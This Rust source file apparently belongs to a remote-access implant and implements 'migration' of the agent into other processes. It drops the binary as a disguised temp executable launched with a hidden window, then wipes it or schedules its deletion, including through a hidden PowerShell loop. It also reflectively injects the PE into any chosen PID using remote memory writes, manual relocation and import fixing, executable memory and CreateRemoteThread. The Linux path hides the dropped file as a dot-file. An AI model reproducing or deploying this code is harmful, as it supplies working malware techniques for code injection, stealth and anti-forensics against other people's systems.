// src/agent/migrate.rs
//
// Process migration: move the agent's runtime into another process.
//
// Two strategies:
//   1. spawn_migrate  — spawn a sacrificial process, inject agent, exit self
//   2. inject_migrate — inject into an existing PID
//
// Both read the current binary's config from the embedded blob, generate
// a bootstrap that manually maps the PE into the target, and transfer
// execution. The old process self-destructs after confirming the new
// instance has connected.

use std::fs;

/// Read the current agent binary from disk.
/// Falls back to reading /proc/self/exe on Linux.
pub fn read_self() -> Result<Vec<u8>, String> {
    let exe = std::env::current_exe().map_err(|e| format!("current_exe: {}", e))?;
    fs::read(&exe).map_err(|e| format!("Read self ({}): {}", exe.display(), e))
}

// ── Windows Implementation ─────────────────────────────────────────────

#[cfg(target_os = "windows")]
pub mod windows {
    use super::*;
    use std::ffi::{c_void, CString};
    use std::ptr;
    use std::mem;
    use rand::RngCore;

    /// Generate a cryptographically random temp filename to prevent prediction
    fn random_temp_name(prefix: &str, ext: &str) -> String {
        let mut buf = [0u8; 16];
        rand::rngs::OsRng.fill_bytes(&mut buf);
        format!("{}{}.{}", prefix, hex::encode(buf), ext)
    }

    /// RAII guard that securely deletes a temp file on drop (even on panic/error).
    /// Records the file's unique identity at creation to detect symlink replacement.
    struct TempFileGuard {
        path: std::path::PathBuf,
        /// File identity recorded at creation (device + inode on Linux, file index on Windows).
        /// Compared at drop time to ensure the file hasn't been swapped for a symlink.
        #[cfg(target_os = "windows")]
        file_index: u64,
        #[cfg(not(target_os = "windows"))]
        inode: u64,
    }
    impl TempFileGuard {
        fn new(path: std::path::PathBuf) -> Self {
            #[cfg(target_os = "windows")]
            {
                // Get the file's unique index for later identity verification.
                let file_index = Self::get_file_index(&path).unwrap_or(0);
                Self { path, file_index }
            }
            #[cfg(not(target_os = "windows"))]
            {
                use std::os::unix::fs::MetadataExt;
                let inode = fs::metadata(&path).map(|m| m.ino()).unwrap_or(0);
                Self { path, inode }
            }
        }

        #[cfg(target_os = "windows")]
        fn get_file_index(path: &std::path::PathBuf) -> Option<u64> {
            use std::os::windows::io::AsRawHandle;

            #[repr(C)]
            struct ByHandleFileInformation {
                dw_file_attributes: u32,
                _ft_creation_time: [u32; 2],
                _ft_last_access_time: [u32; 2],
                _ft_last_write_time: [u32; 2],
                dw_volume_serial_number: u32,
                n_file_size_high: u32,
                n_file_size_low: u32,
                n_number_of_links: u32,
                n_file_index_high: u32,
                n_file_index_low: u32,
            }

            extern "system" {
                fn GetFileInformationByHandle(
                    h: *mut std::ffi::c_void,
                    info: *mut ByHandleFileInformation,
                ) -> i32;
            }

            let f = std::fs::File::open(path).ok()?;
            unsafe {
                let mut info: ByHandleFileInformation = std::mem::zeroed();
                if GetFileInformationByHandle(f.as_raw_handle() as *mut _, &mut info) != 0 {
                    // Combine high and low file index into a single u64.
                    // This is unique per-volume and identifies the actual file
                    // (inode equivalent). Using file SIZE would allow an attacker
                    // to swap in a same-size symlink target undetected.
                    Some(((info.n_file_index_high as u64) << 32) | info.n_file_index_low as u64)
                } else {
                    None
                }
            }
        }
    }
    impl Drop for TempFileGuard {
        fn drop(&mut self) {
            // Reopen the file for writing. Verify identity hasn't changed (symlink swap).
            // NOTE: We intentionally do NOT hold a write handle during the PE's lifetime
            // because Windows prohibits CreateProcessA on files with active write handles
            // (ERROR_SHARING_VIOLATION). The TOCTOU window between file creation and
            // this drop() is mitigated by identity verification below.
            #[cfg(target_os = "windows")]
            {
                if let Some(current_index) = Self::get_file_index(&self.path) {
                    if current_index != self.file_index && self.file_index != 0 {
                        // File identity changed — possible symlink replacement. Don't overwrite.
                        let _ = fs::remove_file(&self.path);
                        return;
                    }
                }
            }
            #[cfg(not(target_os = "windows"))]
            {
                use std::os::unix::fs::MetadataExt;
                if let Ok(meta) = fs::symlink_metadata(&self.path) {
                    if meta.file_type().is_symlink() {
                        // Symlink detected — don't follow it
                        let _ = fs::remove_file(&self.path);
                        return;
                    }
                    if meta.ino() != self.inode && self.inode != 0 {
                        let _ = fs::remove_file(&self.path);
                        return;
                    }
                }
            }

            // Retry opening the file for zeroing with exponential backoff.
            // On Windows, the file may still be locked by the loader for several
            // seconds after CreateProcessA returns. Without retries, the secure
            // wipe silently fails and the unencrypted PE stays on disk permanently.
            let mut wipe_ok = false;
            for attempt in 0..6 {
                if attempt > 0 {
                    std::thread::sleep(std::time::Duration::from_millis(500 * (1 << attempt)));
                }
                if let Ok(mut f) = std::fs::OpenOptions::new().write(true).open(&self.path) {
                    use std::io::Write;
                    let size = f.metadata().map(|m| m.len() as usize).unwrap_or(0);
                    let zero_buf = [0u8; 8192];
                    let mut remaining = size;
                    while remaining > 0 {
                        let to_write = remaining.min(zero_buf.len());
                        if f.write_all(&zero_buf[..to_write]).is_err() { break; }
                        remaining -= to_write;
                    }
                    let _ = f.flush();
                    drop(f);
                    wipe_ok = true;
                    break;
                }
            }
            // Always attempt deletion even if wipe failed
            let _ = fs::remove_file(&self.path);
            if !wipe_ok {
                // Last resort: schedule deletion on next reboot (Windows)
                #[cfg(target_os = "windows")]
                {
                    // MoveFileExW with MOVEFILE_DELAY_UNTIL_REBOOT could be used here
                    // but requires elevated privileges. The file deletion above
                    // will succeed if the process has exited by now.
                }
            }
        }
    }

    extern "system" {
        fn CreateProcessA(
            app: *const i8, cmd: *mut i8, proc_attr: *mut c_void,
            thread_attr: *mut c_void, inherit: i32, flags: u32,
            env: *mut c_void, dir: *mut c_void,
            si: *mut STARTUPINFOA, pi: *mut PROCESS_INFORMATION,
        ) -> i32;
        fn VirtualAllocEx(proc: *mut c_void, addr: *mut c_void, size: usize, at: u32, prot: u32) -> *mut c_void;
        fn WriteProcessMemory(proc: *mut c_void, addr: *mut c_void, buf: *const c_void, size: usize, written: *mut usize) -> i32;
        fn ReadProcessMemory(proc: *mut c_void, addr: *const c_void, buf: *mut c_void, size: usize, read: *mut usize) -> i32;
        fn VirtualProtectEx(proc: *mut c_void, addr: *mut c_void, size: usize, new: u32, old: *mut u32) -> i32;
        fn CreateRemoteThread(proc: *mut c_void, attr: *mut c_void, stack: usize, start: *const c_void, param: *mut c_void, flags: u32, tid: *mut u32) -> *mut c_void;
        fn CloseHandle(h: *mut c_void) -> i32;
        fn ResumeThread(h: *mut c_void) -> u32;
        fn GetLastError() -> u32;
        fn WaitForSingleObject(h: *mut c_void, ms: u32) -> u32;
    }

    #[repr(C)]
    struct STARTUPINFOA {
        cb: u32, _pad: [u8; 64],
    }

    #[repr(C)]
    struct PROCESS_INFORMATION {
        h_process: *mut c_void,
        h_thread: *mut c_void,
        dw_process_id: u32,
        dw_thread_id: u32,
    }

    const CREATE_SUSPENDED: u32 = 0x00000004;
    const MEM_COMMIT: u32 = 0x1000;
    const MEM_RESERVE: u32 = 0x2000;
    const PAGE_READWRITE: u32 = 0x04;
    const PAGE_EXECUTE_READ: u32 = 0x20;
    const PAGE_EXECUTE_READWRITE: u32 = 0x40;

    /// Spawn the agent as a new hidden process.
    ///
    /// Writes PE to a temp file, spawns it directly via CreateProcess (hidden window),
    /// waits for the process to initialize, then securely deletes the temp file.
    ///
    /// NOTE: This touches disk. A stealthier approach would use process hollowing
    /// or reflective injection, but this is reliable across all PE types.
    pub unsafe fn spawn_migrate(binary_path: &str, pe_bytes: &[u8]) -> Result<String, String> {
        let _ = binary_path; // unused — we spawn the PE directly, not a host process
        
        let temp_dir = std::env::temp_dir();
        let temp_name = random_temp_name("svc_", "exe");
        let temp_path = temp_dir.join(&temp_name);
        fs::write(&temp_path, pe_bytes).map_err(|e| format!("Write temp: {}", e))?;

        // RAII guard: securely overwrites and deletes the temp file on drop.
        // Only effective if CreateProcessA FAILS — if it succeeds, the new
        // agent process locks the file and Windows prohibits write access.
        let mut guard = TempFileGuard::new(temp_path.clone());

        let app = CString::new(temp_path.to_string_lossy().as_ref()).map_err(|_| "Invalid path")?;
        let mut si: STARTUPINFOA = mem::zeroed();
        si.cb = mem::size_of::<STARTUPINFOA>() as u32;
        let mut pi: PROCESS_INFORMATION = mem::zeroed();

        // CREATE_NO_WINDOW (0x08000000) hides the console
        const CREATE_NO_WINDOW: u32 = 0x08000000;
        if CreateProcessA(
            app.as_ptr(), ptr::null_mut(), ptr::null_mut(), ptr::null_mut(),
            0, CREATE_NO_WINDOW, ptr::null_mut(), ptr::null_mut(), &mut si, &mut pi,
        ) == 0 {
            // guard drops here → securely deletes (file isn't locked)
            return Err(format!("CreateProcess failed: {}", GetLastError()));
        }

        let pid = pi.dw_process_id;

        // Wait for the new process to load the PE image from disk.
        WaitForSingleObject(pi.h_process, 3000);
        std::thread::sleep(std::time::Duration::from_secs(2));

        CloseHandle(pi.h_thread);
        CloseHandle(pi.h_process);

        // The new agent process is running indefinitely from the temp file.
        // Windows locks running executables — TempFileGuard's wipe will fail.
        // Instead of silently leaving the payload on disk, schedule deletion
        // for the next reboot. The new agent's own self_destruct() will also
        // attempt cleanup when it eventually exits.
        //
        // Disable the guard's wipe (which would fail anyway) and use
        // MoveFileExW to schedule reboot deletion.
        #[cfg(target_os = "windows")]
        {
            extern "system" {
                fn MoveFileExW(src: *const u16, dst: *const u16, flags: u32) -> i32;
            }
            const MOVEFILE_DELAY_UNTIL_REBOOT: u32 = 0x4;
            let wide_path: Vec<u16> = temp_path.to_string_lossy()
                .encode_utf16()
                .chain(std::iter::once(0))
                .collect();
            let scheduled = MoveFileExW(wide_path.as_ptr(), std::ptr::null(), MOVEFILE_DELAY_UNTIL_REBOOT);

            if scheduled == 0 {
                // MoveFileExW failed — likely running as unprivileged user (requires
                // admin to write PendingFileRenameOperations). Fall back to a deferred
                // PowerShell delete. The file is locked now but the shell command will
                // retry until the process exits or reboot.
                let path_escaped = temp_path.to_string_lossy().replace('\'', "''");
                let ps_cmd = format!(
                    "Start-Sleep -Seconds 60; \
                     for ($i=0; $i -lt 10; $i++) {{ \
                       try {{ Remove-Item -Path '{}' -Force -ErrorAction Stop; break }} \
                       catch {{ Start-Sleep -Seconds 30 }} \
                     }}",
                    path_escaped
                );
                let _ = std::process::Command::new("powershell")
                    .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &ps_cmd])
                    .spawn();
            }
        }

        // Prevent the guard from trying to wipe the locked file
        // (it would fail and leave misleading retry-backoff delays)
        std::mem::forget(guard);

        Ok(format!("Spawned new process PID {}", pid))
    }

    /// Inject the agent PE into an existing process.
    pub unsafe fn inject_migrate(pid: u32, pe_bytes: &[u8]) -> Result<String, String> {
        extern "system" {
            fn OpenProcess(access: u32, inherit: i32, pid: u32) -> *mut c_void;
        }
        const PROCESS_ALL_ACCESS: u32 = 0x001F0FFF;

        let h_process = OpenProcess(PROCESS_ALL_ACCESS, 0, pid);
        if h_process.is_null() {
            return Err(format!("OpenProcess({}) failed: {}", pid, GetLastError()));
        }

        let result = inject_pe_into_process(h_process, pe_bytes);
        CloseHandle(h_process);
        result.map(|_| format!("Migrated into PID {}", pid))
    }

    /// Inject into an existing process via remote PE mapping.
    ///
    /// Maps the agent PE directly into the target process's memory space
    /// and executes it via CreateRemoteThread — no disk writes, no WinExec,
    /// no temp files. This is a standard reflective-injection technique.
    ///
    /// Steps:
    ///   1. Parse our PE headers
    ///   2. VirtualAllocEx in the target at the preferred base (or relocated)
    ///   3. Write PE sections into the remote allocation
    ///   4. Apply base relocations if the allocation base differs from preferred
    ///   5. Resolve IAT (system DLLs share the same base across processes)
    ///   6. CreateRemoteThread at the PE entry point
    unsafe fn inject_pe_into_process(h_process: *mut c_void, pe_bytes: &[u8]) -> Result<(), String> {
        extern "system" {
            fn LoadLibraryA(name: *const i8) -> *mut c_void;
            fn GetProcAddress(module: *mut c_void, name: *const i8) -> *mut c_void;
        }

        if pe_bytes.len() < 0x40 { return Err("PE too small".into()); }

        // Parse DOS/NT headers
        let dos_magic = u16::from_le_bytes([pe_bytes[0], pe_bytes[1]]);
        if dos_magic != 0x5A4D { return Err("Invalid DOS header".into()); }
        let e_lfanew = u32::from_le_bytes(pe_bytes[0x3C..0x40].try_into().unwrap()) as usize;
        if e_lfanew + 0x108 > pe_bytes.len() { return Err("NT header out of bounds".into()); }

        let nt_sig = u32::from_le_bytes(pe_bytes[e_lfanew..e_lfanew+4].try_into().unwrap());
        if nt_sig != 0x4550 { return Err("Invalid PE signature".into()); }

        // File header
        let fh = e_lfanew + 4;
        let num_sections = u16::from_le_bytes(pe_bytes[fh+2..fh+4].try_into().unwrap()) as usize;
        let opt_size = u16::from_le_bytes(pe_bytes[fh+16..fh+18].try_into().unwrap()) as usize;
        let oh = fh + 20; // optional header

        let image_base = u64::from_le_bytes(pe_bytes[oh+24..oh+32].try_into().unwrap());
        let size_of_image = u32::from_le_bytes(pe_bytes[oh+56..oh+60].try_into().unwrap()) as usize;
        let entry_rva = u32::from_le_bytes(pe_bytes[oh+16..oh+20].try_into().unwrap()) as usize;
        let size_of_headers = u32::from_le_bytes(pe_bytes[oh+60..oh+64].try_into().unwrap()) as usize;

        // Try preferred base, fall back to any address
        let mut remote_base = VirtualAllocEx(
            h_process, image_base as *mut c_void,
            size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
        );
        if remote_base.is_null() {
            remote_base = VirtualAllocEx(
                h_process, ptr::null_mut(),
                size_of_image, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
            );
        }
        if remote_base.is_null() {
            return Err(format!("VirtualAllocEx failed: {}", GetLastError()));
        }

        let delta = remote_base as i64 - image_base as i64;

        // Write PE headers
        let mut written = 0usize;
        WriteProcessMemory(h_process, remote_base, pe_bytes.as_ptr() as *const c_void,
            size_of_headers.min(pe_bytes.len()), &mut written);

        // Write sections
        let sections_off = oh + opt_size;
        for i in 0..num_sections {
            let s = sections_off + i * 40;
            if s + 40 > pe_bytes.len() { break; }
            let virt_addr = u32::from_le_bytes(pe_bytes[s+12..s+16].try_into().unwrap()) as usize;
            let raw_size = u32::from_le_bytes(pe_bytes[s+16..s+20].try_into().unwrap()) as usize;
            let raw_ptr = u32::from_le_bytes(pe_bytes[s+20..s+24].try_into().unwrap()) as usize;
            if raw_size == 0 || raw_ptr == 0 { continue; }
            let end = (raw_ptr + raw_size).min(pe_bytes.len());
            if raw_ptr >= pe_bytes.len() { continue; }

            let dest = (remote_base as usize + virt_addr) as *mut c_void;
            WriteProcessMemory(h_process, dest,
                pe_bytes[raw_ptr..end].as_ptr() as *const c_void, end - raw_ptr, &mut written);
        }

        // Read the remote image back for patching (relocations + IAT).
        // We do both in a single read-modify-write cycle.
        let mut image_copy = vec![0u8; size_of_image];
        ReadProcessMemory(h_process, remote_base, image_copy.as_mut_ptr() as *mut c_void,
            size_of_image, &mut written);

        // Apply base relocations if we didn't get the preferred base
        if delta != 0 {
            let reloc_rva = u32::from_le_bytes(pe_bytes[oh+152..oh+156].try_into().unwrap()) as usize;
            let reloc_size = u32::from_le_bytes(pe_bytes[oh+156..oh+160].try_into().unwrap()) as usize;
            if reloc_rva != 0 && reloc_size != 0 {
                let mut offset = reloc_rva;
                while offset < reloc_rva + reloc_size {
                    if offset + 8 > image_copy.len() { break; }
                    let page_rva = u32::from_le_bytes(image_copy[offset..offset+4].try_into().unwrap()) as usize;
                    let block_sz = u32::from_le_bytes(image_copy[offset+4..offset+8].try_into().unwrap()) as usize;
                    if block_sz < 8 { break; }

                    let num_entries = (block_sz - 8) / 2;
                    for j in 0..num_entries {
                        let entry_off = offset + 8 + j * 2;
                        if entry_off + 2 > image_copy.len() { break; }
                        let entry = u16::from_le_bytes(image_copy[entry_off..entry_off+2].try_into().unwrap());
                        let reloc_type = (entry >> 12) & 0xF;
                        let reloc_offset = (entry & 0xFFF) as usize;

                        if reloc_type == 10 { // IMAGE_REL_BASED_DIR64
                            let addr = page_rva + reloc_offset;
                            if addr + 8 <= image_copy.len() {
                                let val = u64::from_le_bytes(image_copy[addr..addr+8].try_into().unwrap());
                                let new_val = (val as i64 + delta) as u64;
                                image_copy[addr..addr+8].copy_from_slice(&new_val.to_le_bytes());
                            }
                        }
                    }
                    offset += block_sz;
                }
            }
        }

        // Resolve Import Address Table (IAT).
        // Without this, import thunks remain as raw RVAs and every call to an
        // external API (kernel32, ntdll, etc.) jumps to an invalid address,
        // instantly crashing the target process.
        //
        // System DLLs (kernel32, ntdll, etc.) are mapped at the same virtual
        // address in all processes, so we can resolve addresses in OUR process
        // and write them into the remote image.
        let import_rva = u32::from_le_bytes(pe_bytes[oh+120..oh+124].try_into().unwrap()) as usize;
        let import_size = u32::from_le_bytes(pe_bytes[oh+124..oh+128].try_into().unwrap()) as usize;
        if import_rva != 0 && import_size != 0 {
            // Each import descriptor is 20 bytes
            let mut desc_off = import_rva;
            loop {
                if desc_off + 20 > image_copy.len() { break; }
                let name_rva = u32::from_le_bytes(image_copy[desc_off+12..desc_off+16].try_into().unwrap()) as usize;
                if name_rva == 0 { break; } // null terminator

                let olt_rva = u32::from_le_bytes(image_copy[desc_off..desc_off+4].try_into().unwrap()) as usize;
                let iat_rva = u32::from_le_bytes(image_copy[desc_off+16..desc_off+20].try_into().unwrap()) as usize;
                let lookup_rva = if olt_rva != 0 { olt_rva } else { iat_rva };

                // Read DLL name from image
                if name_rva < image_copy.len() {
                    let name_end = image_copy[name_rva..].iter().position(|&b| b == 0).unwrap_or(0) + name_rva;
                    let dll_name = std::ffi::CString::new(&image_copy[name_rva..name_end])
                        .unwrap_or_else(|_| std::ffi::CString::new("").unwrap());
                    let h_dll = LoadLibraryA(dll_name.as_ptr());

                    if !h_dll.is_null() {
                        let mut thunk_off = 0usize;
                        loop {
                            if lookup_rva + thunk_off + 8 > image_copy.len() { break; }
                            let thunk = u64::from_le_bytes(
                                image_copy[lookup_rva+thunk_off..lookup_rva+thunk_off+8].try_into().unwrap()
                            );
                            if thunk == 0 { break; }

                            let func_addr = if thunk & (1u64 << 63) != 0 {
                                // Import by ordinal
                                GetProcAddress(h_dll, (thunk & 0xFFFF) as usize as *const i8)
                            } else {
                                // Import by name (skip 2-byte hint)
                                let hint_rva = thunk as usize + 2;
                                if hint_rva < image_copy.len() {
                                    let fn_end = image_copy[hint_rva..].iter().position(|&b| b == 0).unwrap_or(0) + hint_rva;
                                    let fn_name = std::ffi::CString::new(&image_copy[hint_rva..fn_end])
                                        .unwrap_or_else(|_| std::ffi::CString::new("").unwrap());
                                    GetProcAddress(h_dll, fn_name.as_ptr())
                                } else { ptr::null_mut() }
                            };

                            // Write resolved address into IAT
                            let iat_slot = iat_rva + thunk_off;
                            if iat_slot + 8 <= image_copy.len() {
                                let addr_val = func_addr as u64;
                                image_copy[iat_slot..iat_slot+8].copy_from_slice(&addr_val.to_le_bytes());
                            }
                            thunk_off += 8;
                        }
                    }
                }
                desc_off += 20;
            }
        }

        // Write the fully patched image (relocations + IAT) back
        WriteProcessMemory(h_process, remote_base, image_copy.as_ptr() as *const c_void,
            size_of_image, &mut written);

        // Set memory to executable
        let mut old = 0u32;
        VirtualProtectEx(h_process, remote_base, size_of_image, PAGE_EXECUTE_READWRITE, &mut old);

        // Create remote thread at entry point
        let entry = (remote_base as usize + entry_rva) as *const c_void;
        let h_thread = CreateRemoteThread(h_process, ptr::null_mut(), 0, entry, remote_base, 0, ptr::null_mut());
        if h_thread.is_null() {
            return Err(format!("CreateRemoteThread failed: {}", GetLastError()));
        }
        CloseHandle(h_thread);

        Ok(())
    }
}

// ── Linux Implementation ───────────────────────────────────────────────

#[cfg(target_os = "linux")]
pub mod linux {
    use super::*;
    use std::os::unix::fs::PermissionsExt;
    use std::process::Command;

    fn random_temp_name(prefix: &str, ext: &str) -> String {
        use rand::RngCore;
        let mut buf = [0u8; 16];
        rand::rngs::OsRng.fill_bytes(&mut buf);
        format!("{}{}.{}", prefix, hex::encode(buf), ext)
    }

    /// On Linux, migration is simpler: fork+exec from a temp copy,
    /// or inject via ptrace (already in injection/linux.rs).
    /// Here we do the fork+exec approach since it's more reliable.
    pub fn spawn_migrate(pe_bytes: &[u8]) -> Result<String, String> {
        let temp_dir = std::env::temp_dir();
        let temp_name = random_temp_name(".", "dll");
        let temp_path = temp_dir.join(&temp_name);

        fs::write(&temp_path, pe_bytes).map_err(|e| format!("Write: {}", e))?;
        fs::set_permissions(&temp_path, fs::Permissions::from_mode(0o755))
            .map_err(|e| format!("Chmod: {}", e))?;

        let child = Command::new(&temp_path)
            .spawn()
            .map_err(|e| format!("Spawn: {}", e))?;

        let pid = child.id();
        let path_display = temp_path.display().to_string();

        // Schedule cleanup of the temp file (the new process has it open)
        std::thread::spawn(move || {
            std::thread::sleep(std::time::Duration::from_secs(3));
            let _ = fs::remove_file(&temp_path);
        });

        Ok(format!("Migrated to PID {} ({})", pid, path_display))
    }
}

// ── Cross-platform dispatch ────────────────────────────────────────────

/// Spawn a new process and migrate the agent into it.
/// On success, the caller should exit the current process.
pub fn migrate_spawn(binary_path: &str) -> Result<String, String> {
    let pe_bytes = read_self()?;

    #[cfg(target_os = "windows")]
    unsafe { return windows::spawn_migrate(binary_path, &pe_bytes); }

    #[cfg(target_os = "linux")]
    { let _ = binary_path; return linux::spawn_migrate(&pe_bytes); }

    #[cfg(not(any(target_os = "windows", target_os = "linux")))]
    Err("Migration not supported on this OS".into())
}

/// Inject the agent into an existing process by PID.
/// On success, the caller should exit the current process.
pub fn migrate_inject(pid: u32) -> Result<String, String> {
    let pe_bytes = read_self()?;

    #[cfg(target_os = "windows")]
    unsafe { return windows::inject_migrate(pid, &pe_bytes); }

    #[cfg(not(target_os = "windows"))]
    {
        let _ = pid;
        let _ = pe_bytes;
        Err("PID migration requires Windows (use migrate:spawn on Linux)".into())
    }
}
